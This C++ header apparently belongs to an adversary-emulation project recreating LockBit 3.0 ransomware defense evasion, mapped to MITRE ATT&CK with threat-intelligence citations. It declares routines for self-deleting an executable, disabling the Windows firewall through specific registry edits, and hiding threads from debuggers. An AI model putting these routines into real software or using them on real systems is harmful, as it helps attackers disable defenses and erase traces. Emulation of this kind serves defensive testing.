#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "util/winapihelper.hpp"
#include <string>

typedef enum _NTDLL_THREAD_INFORMATION_CLASS {
    ThreadBasicInformation,
    ThreadTimes,
    ThreadPriority,
    ThreadBasePriority,
    ThreadAffinityMask,
    ThreadImpersonationToken,
    ThreadDescriptorTableEntry,
    ThreadEnableAlignmentFaultFixup,
    ThreadEventPair,
    ThreadQuerySetWin32StartAddress,
    ThreadZeroTlsCell,
    ThreadPerformanceCount,
    ThreadAmILastThread,
    ThreadIdealProcessor,
    ThreadPriorityBoost,
    ThreadSetTlsArrayAddress,
    ThreadIsIoPending,
    ThreadHideFromDebugger
} NTDLL_THREAD_INFORMATION_CLASS, *PNTDLL_THREAD_INFORMATION_CLASS;

typedef NTSTATUS (NTAPI* FP_NtSetInformationThread)(HANDLE, NTDLL_THREAD_INFORMATION_CLASS, PVOID, ULONG);

namespace defense_evasion {

/*
 * RenameCycleFile (defined in src/self_del_helper/self_del.cpp):
 *      About:
 *          Renames the given file by cycling from the letters A to Z, to reach a total of 26 renaming actions.
 *          The entire filename is replaced by the same letter, repeating that letter throughout the entire
 *          filename's length, including the extension. So a filename C:\path\test.exe will be renamed to
 *          C:\path\AAAAAAAA, C:\path\BBBBBBBB, ... C:\path\ZZZZZZZZ. The function returns the final filename.
 *          File renaming is done using the Windows API call MoveFileW.
 *      Result:
 *          File named from AA..AA all the way to ZZ..ZZ.
 *      Returns:
 *          Final file path of the renamed file.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
std::wstring RenameCycleFile(const std::wstring& path_str);

/*
 * OverWriteRenameAndDeleteFile (defined in src/self_del_helper/self_del.cpp):
 *      About:
 *          Overwrites the given file with "A" characters, then renames it by cycling from the letters A to Z, 
 *          for a total of 26 renaming actions, then deletes the file from disk.
 *          When renaming, the entire filename is replaced by the same letter, repeating that letter throughout the entire
 *          filename's length, including the extension. So a filename C:\path\test.exe will be renamed to
 *          C:\path\AAAAAAAA, C:\path\BBBBBBBB, ... C:\path\ZZZZZZZZ. The function returns the final filename.
 *          File access and writes are done using the CreateFileW and WriteFile API calls.
 *          File renaming is done using the Windows API call MoveFileW.
 *          File deletion is done using the DeleteFileW API call;
 *      Result:
 *          Overwritten, renamed, and deleted file
 *      Returns:
 *          True on success, false on failure.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
bool OverWriteRenameAndDeleteFile(const std::wstring& path);

/*
 * SelfDestruct (defined in src/lockbit_main/def_evasion/invoke_self_del.cpp):
 *      About:
 *          Releases global mutex handle, spawns the auxiliary process to overwrite, rename, and delete
 *          the current executable, and then terminates the current executable to allow the auxiliary
 *          process to complete the self-destruct routine.
 *          The auxiliary process is stored as a resource and dropped to disk prior to being executed.
 *          File write to disk is performed using the CreateFileW and WriteFile API calls.
 *          Process creation is performed using the CreateProcessW API call.
 *          Process exit is performed using the ExitProcess API call.
 *      Result:
 *          Terminate current executable and spawn self-destruct process.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
void SelfDestruct();

/*
 * DisableFirewall (defined in src/lockbit_main/def_evasion/disable_security.cpp):
 *      About:
 *          Disables the Windows firewall (domain and standard profiles) via registry edits. Registry key edits are as follows:
 *          - HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile
 *              - EnableFirewall set to 0
 *          - HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
 *              - EnableFirewall set to 0
 *          Registry edits are performed using the RegCreateKeyExW and RegSetValueExW API calls.
 *      Result:
 *          Disables Windows firewall.
 *      MITRE ATT&CK Techniques:
 *          T1562.004: Impair Defenses: Disable or Modify System Firewall
 *          T1112: Modify Registry
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *
 */
void DisableFirewall();

/*
 * HideThreadFromDebugger (defined in src/lockbit_main/def_evasion/hide_thread.cpp):
 *      About:
 *          Hides the given thread from debuggers by setting its thread information to ThreadHideFromDebugger
 *          using the NtSetInformationThread API call. Throws exception on failure.
 *      Result:
 *          Hides given thread from debugger. Throws exception on failure.
 *      MITRE ATT&CK Techniques:
 *          T1622: Debugger Evasion
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
void HideThreadFromDebugger(HANDLE h_thread);

} // namespace
